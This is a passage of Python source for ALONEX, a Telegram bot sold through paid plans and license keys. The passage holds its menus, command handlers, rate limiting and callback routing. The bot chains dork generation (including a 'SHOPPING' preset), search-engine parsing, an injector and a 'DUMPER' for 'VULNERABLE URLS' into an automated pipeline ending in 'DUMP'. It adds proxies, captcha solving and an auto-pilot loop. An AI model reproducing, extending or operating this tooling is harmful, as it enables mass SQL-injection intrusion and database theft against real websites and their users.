    mk.row(btn("GEN KEY","adm:gen"),btn("KEYS","adm:keys"))
    mk.row(btn("USERS","adm:users"),btn("ADD ADMIN","adm:add"))
    mk.row(btn("APPROVALS","adm:auto"),btn("AUTO SET","adm:autoset"))
    mk.row(btn("SCHEDULER","adm:sched"),btn("RESOURCES","adm:res"))
    mk.row(btn("STATS","adm:stats"),btn("BROADCAST","adm:bcast"))
    mk.row(btn("CHANNELS","adm:ch"),btn("REFER","adm:ref"))
    mk.row(btn("PLANS","adm:plans"),btn("HUNT","adm:hunt"))
    mk.row(btn("SECURITY","adm:sec"),btn("SALE","adm:sale"))
    mk.row(btn("CHUNK","adm:chunk"),btn(f"DNS {'ON' if sget('dns_filter') else 'OFF'}","adm:dns"))
    mk.row(btn("CAPTCHA API","adm:cap"),btn("ENGINES","adm:eng"))
    mk.row(btn(f"EMOJI {'PREMIUM' if sget('emoji_mode','normal')=='premium' else 'NORMAL'}","adm:emo"),btn(f"RATE: {sget('rate_limit_sec',2)}S","adm:ratelimit"))
    mk.row(btn("BACK","back"))
    return mk

def render_screen(uid,cid,mid,scr):
    with STATES_LOCK: states.pop(uid,None)
    set_cur(uid,scr)
    try:
        if scr=="home":
            cap=menu_caption(uid); mk=main_markup(uid)
            try: bot.edit_message_caption(cap,chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML")
            except:
                try: bot.edit_message_text(cap,chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML")
                except: send_main(cid,uid)
            return
        if scr=="proxy":
            bot.edit_message_text(f"<blockquote><b>{E['shield']} PROXY MANAGER {E['zap']}\n{LINE}\n{E['lock']} POOL | {E['tick']} {len(uprox(uid))}</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=proxy_markup(),parse_mode="HTML"); return
        if scr=="admin":
            bot.edit_message_text(f"<blockquote><b>{E['gear']} ALONEADMIN\n{LINE}\nWELCOME, BOSS!</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=admin_markup(uid),parse_mode="HTML"); return
        if scr=="parse":
            mk=types.InlineKeyboardMarkup(); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['globe']} ALONEPARSER\n{LINE}\nSEND DORKS (TEXT/.TXT):</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="inject":
            mk=types.InlineKeyboardMarkup(); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['syringe']} ALONEINJECTOR\n{LINE}\nSEND URLS (TEXT/.TXT):</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="data":
            mk=types.InlineKeyboardMarkup(); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['blood']} ALONEDUMPER\n{LINE}\nSEND VULN URLS:</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="gen":
            mk=types.InlineKeyboardMarkup()
            mk.row(btn("SHOPPING","preset:shopping"),btn("CUSTOM","preset:custom"))
            mk.add(btn("DEFAULT","preset:default")); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['dna']} ALONEDORKER\n{LINE}\nPRESET YA CUSTOM:</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="km":
            mk=types.InlineKeyboardMarkup(); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['brain']} KEYWORD MAKER\n{LINE}\nKEYWORDS BHEJO:</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="combos":
            combos=load_json(COMBOS,{}).get(str(uid),{})
            mk=types.InlineKeyboardMarkup()
            for i,n in enumerate(list(combos.keys())[:8]): mk.row(btn(f"SAVE {n.upper()}",f"combo:use:{i}"),btn("DEL",f"combo:del:{i}"))
            mk.row(btn("SAVE NEW","combo:save"),btn("BACK","back"))
            bot.edit_message_text(f"<blockquote><b>{E['disk']} MY COMBOS\n{LINE}\n{len(combos)} SAVED:</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="plans":
            ps=plans()
            mk=types.InlineKeyboardMarkup()
            for i in range(len(ps)): mk.add(btn(f"BUY {ps[i]['name'].upper()}",f"plan:buy:{i}"))
            back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['gem']} PLANS\n{LINE}\n" + "\n".join(f"◆ {p['name'].upper()} — {p['price']} — {p['days']}D" for p in ps) + "</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="speed":
            mk=types.InlineKeyboardMarkup()
            mk.row(btn("TURBO","speed:turbo"),btn("FAST","speed:fast"))
            mk.row(btn("BALANCED","speed:balanced"),btn("DEEP","speed:deep"))
            back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['zap']} SPEED MODE\n{LINE}\nCURRENT: {U(uid).get('mode','turbo').upper()}</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="lic":
            exp=license_until(uid)
            mk=types.InlineKeyboardMarkup(); mk.row(btn("REDEEM","lic:redeem"),btn("BACK","back"))
            bot.edit_message_text(f"<blockquote><b>{E['ticket']} LICENSE\n{LINE}\n" + (f"{E['tick']} TILL: {datetime.fromtimestamp(exp):%d %b %Y}" if exp else f"{E['cross']} NOT ACTIVE.") + "</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="help":
            mk=types.InlineKeyboardMarkup(); mk.add(btn("BACK","back"))
            bot.edit_message_text(HELP_TXT,chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="subs":
            mk=types.InlineKeyboardMarkup(); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['web']} SUBFINDER\n{LINE}\nDOMAIN BHEJO:</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="ref":
            u=U(uid)
            mk=types.InlineKeyboardMarkup(); mk.add(ubtn("REFER LINK",f"https://t.me/{BOT_USERNAME}?start=REF_{uid}")); back_row(mk)
            bot.edit_message_text(f"<blockquote><b>{E['gift']} REFER & EARN\n{LINE}\n{sget('ref_need',5)} REFERS = {sget('ref_reward_days',1)}D\n{E['tick']} TUMHARE: {u.get('ref_count',0)}</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        if scr=="files":
            idx=load_json(os.path.join(FILES_DIR,str(uid),"index.json"),[])
            mk=types.InlineKeyboardMarkup()
            for i,e in enumerate(reversed(idx)): mk.add(btn(f"FILE {e['n'].upper()}",f"file:{len(idx)-1-i}"))
            mk.add(btn("BACK","back"))
            bot.edit_message_text(f"<blockquote><b>{E['folder']} MY FILES\n{LINE}</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML"); return
        bot.edit_message_text(menu_caption(uid),chat_id=cid,message_id=mid,reply_markup=main_markup(uid),parse_mode="HTML")
    except Exception: send_main(cid,uid)

HELP_TXT=f"""<blockquote><b>{E['skull']} ALONEX — PREMIUM EDITION
{LINE}
{E['rocket']} PIPELINE | {E['robot']} AUTO | {E['brain']} KEYWORDS | {E['dna']} DORKER
{E['globe']} PARSER V2 | {E['syringe']} INJECTOR V3
{E['blood']} DUMPER V2 | {E['shield']} PROXIES | {E['disk']} COMBOS | {E['web']} SUBFINDER
{E['puzzle']} CAPTCHA SOLVER | {E['chart']} LEADERBOARD | {E['lock']} SECURITY
{E['eye']} DNS FILTER | {E['gear']} CHUNK | {E['target']} SCOPE
{LINE}
{E['cross']} STOP=PARTIAL | {E['ticket']} /REDEEM | {E['gear']} /ADMIN</b></blockquote>"""


# ============ HANDLERS ============
@bot.message_handler(commands=["start"])
def m_start(m):
    try:
        uid=m.from_user.id
        if is_banned(uid): 
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} BANNED!</b></blockquote>", parse_mode="HTML")
            return
        ref=None
        if m.text and "REF_" in m.text:
            try: ref=int(m.text.split("REF_")[1].split()[0])
            except: ref=None
        if ref==uid: ref=None
        u=U(uid)
        if not u.get("verified"):
            if ref: setU(uid,{"referred_by":ref,"pending_ref":True,"first_seen":time.time()})
            q,mk=new_captcha(uid)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['skull']} ALONEX\n{LINE}\n{E['robot']} SOLVE: {q} = ?</b></blockquote>", reply_markup=mk, parse_mode="HTML")
            return
        with STATES_LOCK: states.pop(uid,None)
        if sget("channels",[]) and missing_channels(uid): 
            join_screen(m.chat.id,uid)
            return
        send_main(m.chat.id,uid)
    except Exception as e:
        print(f"🚨 START ERROR: {type(e).__name__} - {e}")


@bot.message_handler(commands=["redeem"])
def m_redeem(m):
    try:
        p=m.text.split()
        msg_text = redeem(m.from_user.id,p[1]) if len(p)>1 else f"{E['cross']} USAGE: /redeem KEY"
        bot.reply_to(m, f"<blockquote><b>{msg_text}</b></blockquote>", parse_mode="HTML")
    except Exception:
        pass

@bot.message_handler(commands=["status"])
def m_status(m):
    try:
        uid=m.from_user.id; s=load_json(STATS_DB,{}); u=U(uid); a=AUTO.get(uid)
        status_auto = f"{a['done']}/{a['limit']}" if a else "OFF"
        txt = f"<blockquote><b>{E['chart']} STATUS\n{LINE}\n{E['robot']} AUTO: {status_auto}\n{E['user']} HITS: {sum(u.get('stats',{}).values())}\n{E['dna']} {s.get('gen',0)} | {E['globe']} {s.get('parse',0)} | {E['syringe']} {s.get('inject',0)}\n{E['blood']} {s.get('dump',0)} | {E['rocket']} {s.get('auto',0)}</b></blockquote>"
        bot.send_message(m.chat.id, txt, parse_mode="HTML")
    except Exception:
        pass

@bot.message_handler(commands=["emojis"])
def m_emojis(m):
    try:
        uid=m.from_user.id
        if uid not in admins(): return
        parts=m.text.split()
        if len(parts)<2:
            bot.reply_to(m, f"<blockquote><b>{E['cross']} USAGE: /emojis google</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("pem_cap",{"name":parts[1].lower()})
        bot.reply_to(m, f"<blockquote><b>{E['gear']} SEND CUSTOM EMOJI FOR {parts[1].upper()}:</b></blockquote>", parse_mode="HTML")
    except Exception:
        pass

@bot.message_handler(commands=["test"])
def m_test(m):
    try:
        cid=m.chat.id
        msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} SELF-TEST\n{LINE}\n1/3 GENERATING DORKS...</b></blockquote>", parse_mode="HTML")
        dorks=gen_dorks_list(read_lines(RES_FILES["keywords"]) or KM_PLATS,20)
        bot.edit_message_text(f"<blockquote><b>{E['zap']} SELF-TEST\n{LINE}\n{E['tick']} DORKS: {len(dorks)}\n{E['globe']} PARSING (DDG)...</b></blockquote>", chat_id=cid, message_id=msg.message_id, parse_mode="HTML")
        async def q():
            conn=aiohttp.TCPConnector(limit=20,ssl=False)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=6)) as s:
                return await asyncio.gather(*[a_eng(s,d,"ddg",0,"",None) for d in dorks[:10]])
        try:
            res=_run_on_loop(q())
            urls=[u for r,st in res if r for u in r]
        except Exception: urls=[]
        status = f"{E['tick']} SUCCESS" if urls else f"{E['cross']} BLOCKED"
        bot.edit_message_text(f"<blockquote><b>{E['zap']} SELF-TEST RESULT\n{LINE}\n{E['tick']} DORKS: {len(dorks)}\n{E['globe']} URLS: {len(urls)} [{status}]</b></blockquote>", chat_id=cid, message_id=msg.message_id, parse_mode="HTML")
    except Exception:
        pass

@bot.message_handler(commands=["admin"])
def m_admin(m):
    try:
        uid=m.from_user.id
        if uid not in admins(): 
            bot.reply_to(m, f"<blockquote><b>{E['cross']} NOT AN ADMIN!</b></blockquote>", parse_mode="HTML")
            return
        if sget("otp_on",False):
            with STATES_LOCK:
                if states.get(uid,("",))[0]!="adm_ok":
                    code=str(random.randint(100000,999999))
                    states[uid]=("adm_otp",{"code":code})
                    bot.send_message(uid, f"<blockquote><b>{E['lock']} OTP: {code}</b></blockquote>", parse_mode="HTML")
                    return
        set_cur(uid,"admin")
        show_admin(uid,m.chat.id)
    except Exception as e:
        try: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} ADMIN BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass

def show_admin(uid,cid):
    try:
        send_banner(cid,"admin", f"<blockquote><b>{E['gear']} ALONEADMIN\n{LINE}\nWELCOME, BOSS!</b></blockquote>", admin_markup(uid))
    except Exception:
        pass


# ============ RATE LIMIT MIDDLEWARE ============
@bot.middleware_handler(update_types=['message','callback_query'])
def rate_limit_middleware(bot_instance, update):
    uid=None
    if getattr(update,"from_user",None): uid=update.from_user.id
    if not uid or uid in admins(): return
    limit=sget("rate_limit_sec",2)
    if limit<=0: return
    now=time.time()
    with RATE_LOCK:
        last=RATE_LIMITS.get(uid,0)
        if now-last<limit:
            wait_s=int(limit-(now-last))+1
            if isinstance(update,types.CallbackQuery):
                try: bot_instance.answer_callback_query(update.id, f"TOO FAST! WAIT {wait_s}S.", show_alert=True)
                except: pass
            else:
                try: bot_instance.reply_to(update, f"<blockquote><b>{E['warn']} TOO FAST! PLEASE WAIT {wait_s} SECONDS.</b></blockquote>", parse_mode="HTML")
                except: pass
            return False
        RATE_LIMITS[uid]=now

# ============ CB WRAPPER (INSTANT) ============
def _ansq(qid):
    try: bot.answer_callback_query(qid)
    except: pass

@bot.callback_query_handler(func=lambda c:True)
def cb(c):
    threading.Thread(target=_ansq,args=(c.id,),daemon=True).start()
    try: _cb(c)
    except Exception as e:
        es=str(e)
        if any(x in es for x in ("query is too old","response timeout expired","message is not modified","message to edit not found","message to delete not found","chat not found")): return
        try: bot.send_message(c.message.chat.id, f"<blockquote><b>{E['cross']} BUG DETECTED:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass

def _cb(c):
    uid=c.from_user.id; cid=c.message.chat.id; mid=c.message.message_id
    d=c.data
    if d.startswith("stop:"):
        jid=d[5:]
        mk=types.InlineKeyboardMarkup()
        mk.row(sbtn("YES","stopcf:"+jid,"danger"),sbtn("NO","stopno:"+jid,"success"))
        bot.send_message(cid, f"<blockquote><b>{E['warn']} CONFIRM STOP</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    if d.startswith("stopcf:"):
        jid=d[7:]
        with JOBS_LOCK:
            if jid in JOBS: JOBS[jid]["stop"]=True
        try: bot.edit_message_text(f"<blockquote><b>{E['cross']} STOPPED! GENERATING PARTIAL FILE...</b></blockquote>", chat_id=cid, message_id=mid, parse_mode="HTML")
        except: pass
        return
    if d.startswith("stopno:"):
        try: bot.delete_message(cid,mid)
        except: pass
        return
    if d=="adm:emo":
        st=S(); st["emoji_mode"]="premium" if sget("emoji_mode","normal")!="premium" else "normal"
        setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['star']} EMOJI MODE: {'PREMIUM' if st['emoji_mode']=='premium' else 'NORMAL'}</b></blockquote>", parse_mode="HTML")
        return
    if d=="adm:chunk":
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("1","chunk:1"),btn("5K","chunk:5000"),btn("10K","chunk:10000"))
        mk.row(btn("50K","chunk:50000"),btn("100K","chunk:100000"))
        mk.row(btn("CUSTOM","chunk:custom"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['gear']} CHUNK MANAGER\n{LINE}\nCURRENT: {sget('admin_chunk_size',5000)}</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    if d.startswith("chunk:"):
        val=d[6:]
        if val=="custom":
            with STATES_LOCK: states[uid]=("set_chunk",{})
            bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER CHUNK SIZE (1-1000000):</b></blockquote>", parse_mode="HTML"); return
        try:
            st=S(); st["admin_chunk_size"]=int(val); setS(st)
            bot.send_message(cid, f"<blockquote><b>{E['tick']} CHUNK SIZE SET TO: {val}</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(cid, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
        return
    if d=="adm:dns":
        st=S(); st["dns_filter"]=not sget("dns_filter",False); setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['eye']} DNS FILTER: {'ON' if st['dns_filter'] else 'OFF'}</b></blockquote>", parse_mode="HTML"); return
    if d=="adm:eng":
        w=ew_get()
        out="\n".join(f"{k.upper()}: {v} HITS" for k,v in sorted(w.items(),key=lambda x:-x[1]))
        bot.send_message(cid, f"<blockquote><b>{E['chart']} ENGINE LEADERBOARD\n{LINE}\n{out or 'NO DATA YET! RUN PARSER.'}</b></blockquote>", parse_mode="HTML"); return
    if d=="adm:cap":
        with STATES_LOCK: states[uid]=("set_capkey",{})
        bal=cap_balance()
        bot.send_message(cid, f"<blockquote><b>{E['puzzle']} 2CAPTCHA API\n{LINE}\nBALANCE: {bal if bal is not None else '---'}\n{E['lock']} SEND API KEY:</b></blockquote>", parse_mode="HTML"); return
    if d=="adm:ratelimit":
        with STATES_LOCK: states[uid]=("set_ratelimit",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} RATE LIMIT\n{LINE}\nSECONDS BETWEEN COMMANDS (0=OFF):</b></blockquote>", parse_mode="HTML"); return
    if d=="autostop":
        if uid in AUTO: AUTO[uid]["stop"]=True
        bot.send_message(cid, f"<blockquote><b>{E['cross']} STOPPING AUTO PILOT...</b></blockquote>", parse_mode="HTML"); return
    if d.startswith("autol:"):
        if str(uid) not in sget("auto_approved",[]): bot.send_message(cid, f"<blockquote><b>{E['cross']} APPROVAL REQUIRED!</b></blockquote>", parse_mode="HTML"); return
        if uid in AUTO: bot.send_message(cid, f"<blockquote><b>{E['robot']} ALREADY ACTIVE!</b></blockquote>", parse_mode="HTML"); return
        threading.Thread(target=auto_loop,args=(uid,cid,int(d[6:]))).start()
        bot.send_message(cid, f"<blockquote><b>{E['robot']} AUTO PILOT ACTIVATED\n{LINE}\nCYCLES: {min(int(d[6:]),100)}</b></blockquote>", parse_mode="HTML"); return
    if d=="menu:auto":
        a=AUTO.get(uid)
        mk=types.InlineKeyboardMarkup()
        if a: 
            mk.add(sbtn("STOP","autostop","danger"))
            bot.send_message(cid, f"<blockquote><b>{E['robot']} RUNNING {a['done']}/{a['limit']}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
        else:
            mk.row(btn("5 CYCLES","autol:5"),btn("10 CYCLES","autol:10"),btn("25 CYCLES","autol:25"))
            mk.row(btn("50 CYCLES","autol:50"),btn("MAX CYCLES","autol:100"))
            back_row(mk)
            bot.send_message(cid, f"<blockquote><b>{E['robot']} AUTO PILOT\n{LINE}\nSELECT LIMIT:</b></blockquote>", reply_markup=mk, parse_mode="HTML")
        return
    if d=="menu:pipe":
        if not lic_gate(cid,uid): return
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("KEYWORDS","pipe:kw"),btn("COMBO","pipe:combo"))
        back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['rocket']} FULL PIPELINE\n{LINE}\nKW → DORKS → URLS → SCAN → DUMP</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    if d=="pipe:kw":
        with STATES_LOCK: states[uid]=("pipe_kw",{})
        bot.send_message(cid, f"<blockquote><b>{E['brain']} SEND KEYWORDS:</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML"); return
    if d=="pipe:combo":
        combos=load_json(COMBOS,{}).get(str(uid),{})
        if not combos: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO COMBOS FOUND.</b></blockquote>", parse_mode="HTML"); return
        mk=types.InlineKeyboardMarkup()
        for i,n in enumerate(list(combos.keys())[:8]): mk.add(btn(f"{n.upper()}","pipec:{i}"))
        back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['disk']} SELECT COMBO:</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    if d.startswith("pipec:"):
        combos=load_json(COMBOS,{}).get(str(uid),{}); ks=list(combos.keys()); i=int(d[6:])
        if i<len(ks):
            jid=new_job()
            msg=bot.send_message(cid, f"<blockquote><b>{E['rocket']} STARTING PIPELINE...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
            threading.Thread(target=pipeline_run,args=(cid,uid,msg.message_id,jid,combos[ks[i]],500,True)).start()
        return
    if d=="menu:combos":
        set_cur(uid,"combos")
        combos=load_json(COMBOS,{}).get(str(uid),{})
        mk=types.InlineKeyboardMarkup()
        for i,n in enumerate(list(combos.keys())[:8]): mk.row(btn(f"USE {n.upper()}",f"combo:use:{i}"),btn("DEL",f"combo:del:{i}"))
        mk.row(btn("SAVE NEW","combo:save"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['disk']} MY COMBOS\n{LINE}\n{len(combos)} SAVED:</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    if d=="combo:save":
        with STATES_LOCK: states[uid]=("combo_name",{})
        set_cur(uid,"combo_name"); bot.send_message(cid, f"<blockquote><b>{E['disk']} ENTER COMBO NAME:</b></blockquote>", parse_mode="HTML"); return
    if d.startswith("combo:del:"):
        cb_db=load_json(COMBOS,{}); cs=cb_db.get(str(uid),{}); ks=list(cs.keys()); i=int(d[9:])
        if i<len(ks):
            del cs[ks[i]]; cb_db[str(uid)]=cs; save_json(COMBOS,cb_db); bot.send_message(cid, f"<blockquote><b>{E['tick']} DELETED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
        return
    if d.startswith("combo:use:"):
        combos=load_json(COMBOS,{}).get(str(uid),{}); ks=list(combos.keys()); i=int(d[9:])
        if i<len(ks):
            with STATES_LOCK: states[uid]=("gen_count",{"kws":combos[ks[i]]})
            set_cur(uid,"gen_count"); ask_count(cid)
        return
    if d.startswith("fresh:"):
        with STATES_LOCK:
            st=states.get(uid)
            if st and st[0]=="parse_engine": 
                st[1]["fresh"]=d[6:]
                fresh_map = {"d":"24 HOURS","w":"1 WEEK"}
                bot.send_message(cid, f"<blockquote><b>{E['tick']} FRESHNESS SET TO: {fresh_map.get(d[6:],'ALL TIME')}</b></blockquote>", parse_mode="HTML")
        return
    if d.startswith("cap:"):
        val=int(d[4:])
        with STATES_LOCK: st=states.get(uid)
        if st and st[0]=="captcha":
            if val==st[1]["ans"]:
                u_data = U(uid)
                is_new = not u_data.get("verified")
                now = time.time()
                
                # Setup user data
                patch = {"verified":True,"username":c.from_user.username or "","first_name":c.from_user.first_name or "","mode":"turbo"}
                
                # 🎁 15-MINUTE FREE TRIAL FOR NEW USERS
                if is_new and not u_data.get("since"):
                    patch["since"] = now
                    patch["bonus_until"] = now + 900 # 15 mins (900 seconds)
                
                setU(uid,patch)
                with STATES_LOCK: states.pop(uid,None)
                
                rb=u_data.get("referred_by")
                if rb and u_data.get("pending_ref"):
                    if fake_check(uid,c.from_user.username or "",c.from_user.first_name or ""):
                        add_flag(rb,"fake refer"); ban(uid)
                        bot.edit_message_text(f"<blockquote><b>{E['cross']} FAKE REFER DETECTED!</b></blockquote>",chat_id=cid,message_id=mid,parse_mode="HTML"); return
                
                bot.edit_message_text(f"<blockquote><b>{E['tick']} {L(uid)['ver'].upper()}</b></blockquote>",chat_id=cid,message_id=mid,parse_mode="HTML")
                
                # Send Trial Notification
                if is_new:
                    bot.send_message(cid, f"<blockquote><b>{E['gift']} WELCOME BONUS!\n{LINE}\n{E['ticket']} YOU GOT A 15-MINUTE FREE VIP TRIAL TO TEST THE BOT. ENJOY THE SPEED! ⚡</b></blockquote>", parse_mode="HTML")

                if sget("channels",[]) and missing_channels(uid): join_screen(cid,uid)
                else: send_main(cid,uid)
            else:
                q,mk=new_captcha(uid)
                bot.edit_message_text(f"<blockquote><b>{E['cross']} INCORRECT!\n{E['robot']} SOLVE: {q} = ?</b></blockquote>",chat_id=cid,message_id=mid,reply_markup=mk,parse_mode="HTML")
        return
    if d=="join:verify": join_screen(cid,uid); return
    if d=="menu:join": join_screen(cid,uid); return
    if d=="menu:lang":
        cur=U(uid).get("lang","en"); nxt={"en":"ur","ur":"hi","hi":"en"}[cur]
        setU(uid,{"lang":nxt}); bot.send_message(cid, f"<blockquote><b>{E['globe']} LANGUAGE SET TO: {nxt.upper()}</b></blockquote>", parse_mode="HTML"); return
    if d=="menu:subs":
        if not lic_gate(cid,uid): return
        set_cur(uid,"subs")
        with STATES_LOCK: states[uid]=("subs_dom",{})
        mk=types.InlineKeyboardMarkup(); back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['web']} SUBFINDER\n{LINE}\nENTER DOMAIN:</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    if d=="menu:plans":
        set_cur(uid,"plans")
        ps=plans()
        mk=types.InlineKeyboardMarkup()
        for i in range(len(ps)): mk.add(sbtn(f"BUY {ps[i]['name'].upper()}","plan:buy:{i}","success"))
        back_row(mk)
        send_banner(cid,"plans", f"<blockquote><b>{E['gem']} PLANS & PRICING\n{LINE}\n" + "\n".join(f"◆ {p['name'].upper()} — {p['price']} — {p['days']} DAYS" for p in ps) + "</b></blockquote>", mk)
    elif d.startswith("plan:buy:"):
        ps=plans(); i=int(d[9:])
        if i<len(ps):
            mk=types.InlineKeyboardMarkup(); mk.add(ubtn("CONTACT TO BUY",fix_url(sget("sc_contact","")))); back_row(mk)
            bot.send_message(cid, f"<blockquote><b>{E['gem']} {ps[i]['name'].upper()}\n{E['money']} {ps[i]['price']} | {E['ticket']} {ps[i]['days']} DAYS</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="menu:km":
        if not lic_gate(cid,uid): return
        set_cur(uid,"km")
        with STATES_LOCK: states[uid]=("km_kw",{})
        mk=types.InlineKeyboardMarkup(); back_row(mk)
        send_banner(cid,"keywords", f"<blockquote><b>{E['brain']} KEYWORD MAKER\n{LINE}\nSEND KEYWORDS (TEXT/.TXT):</b></blockquote>", mk)
    elif d.startswith("kmc:"):
        with STATES_LOCK: st=states.get(uid)
        if st and st[0]=="km_count":
            kws=st[1]["kws"]
            with STATES_LOCK: states.pop(uid,None)
            threading.Thread(target=run_km,args=(cid,uid,kws,int(d[4:]))).start()
    elif d=="menu:gen":
        if not lic_gate(cid,uid): return
        set_cur(uid,"gen")
        mk=types.InlineKeyboardMarkup()
        mk.row(sbtn("SHOPPING","preset:shopping","success"),sbtn("CUSTOM","preset:custom","primary"))
        mk.add(sbtn("DEFAULT","preset:default","primary"))
        back_row(mk)
        send_banner(cid,"dorker", f"<blockquote><b>{E['dna']} ALONEDORKER\n{LINE}\nSELECT PRESET OR CUSTOM:</b></blockquote>", mk)
    elif d.startswith("preset:"):
        if not lic_gate(cid,uid): return
        k=d[7:]
        if k=="custom":
            with STATES_LOCK: states[uid]=("gen_kw",{})
            set_cur(uid,"gen"); bot.send_message(cid, f"<blockquote><b>{E['brain']} SEND KEYWORDS:</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
        else:
            with STATES_LOCK: states[uid]=("gen_count",{"kws":PRESETS.get(k,[])})
            set_cur(uid,"gen_count"); ask_count(cid)
    elif d.startswith("genc:"):
        if d=="genc:custom":
            with STATES_LOCK: st=states.get(uid)
            if st and st[0]=="gen_count":
                with STATES_LOCK: states[uid]=("gen_amount",{"kws":st[1]["kws"]})
                set_cur(uid,"gen_amount")
                bot.send_message(cid, f"<blockquote><b>{E['dna']} ENTER AMOUNT (1 - 1,000,000):</b></blockquote>", parse_mode="HTML")
        else: start_gen(cid,uid,int(d[5:]))
    elif d=="menu:parse":
        if not lic_gate(cid,uid): return
        set_cur(uid,"parse")
        with STATES_LOCK: states[uid]=("parse_dorks",{})
        mk=types.InlineKeyboardMarkup(); back_row(mk)
        send_banner(cid,"parser", f"<blockquote><b>{E['globe']} ALONEPARSER\n{LINE}\nSEND DORKS (TEXT/.TXT):</b></blockquote>", mk)
    elif d.startswith("peng:"):
        with STATES_LOCK: st=states.pop(uid,None)
        if not st or st[0]!="parse_engine": return
        eng=d[5:]; fresh=st[1].get("fresh","")
        
        # 🚨 YEH 3 LINES ADD KIYI HAI
        threads=st[1].get("threads",15)
        pages=st[1].get("pages",1)
        workers=st[1].get("workers",40)
        
        engines=ALL_ENGINES if eng=="all" else [eng]
        jid=new_job(); mode=get_mode(uid)
        msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} STARTING PARSER...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
        
        # 🚨 THREADS KE SATH PAGES AUR WORKERS BHI PASS KIYE
        threading.Thread(target=turbo_parse,args=(cid,uid,msg.message_id,jid,st[1]["dorks"],engines,fresh,mode,threads,pages,workers)).start()
    elif d=="menu:inject":
        if not lic_gate(cid,uid): return
        set_cur(uid,"inject")
        with STATES_LOCK: states[uid]=("dump_urls",{})
        mk=types.InlineKeyboardMarkup(); back_row(mk)
        send_banner(cid,"injector", f"<blockquote><b>{E['syringe']} ALONEINJECTOR\n{LINE}\nSEND URLS (TEXT/.TXT):</b></blockquote>", mk)
    elif d=="menu:data":
        if not lic_gate(cid,uid): return
        set_cur(uid,"data")
        with STATES_LOCK: states[uid]=("data_urls",{})
        mk=types.InlineKeyboardMarkup(); back_row(mk)
        send_banner(cid,"dumper", f"<blockquote><b>{E['blood']} ALONEDUMPER\n{LINE}\nSEND VULNERABLE URLS:</b></blockquote>", mk)
    elif d.startswith("dfilt:"):
        with STATES_LOCK: st=states.get(uid)
        if st and st[0]=="data_filter":
            urls=st[1]["urls"]
            with STATES_LOCK: states.pop(uid,None)
            jid=new_job(); mode=get_mode(uid)
            msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} STARTING DUMPER...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
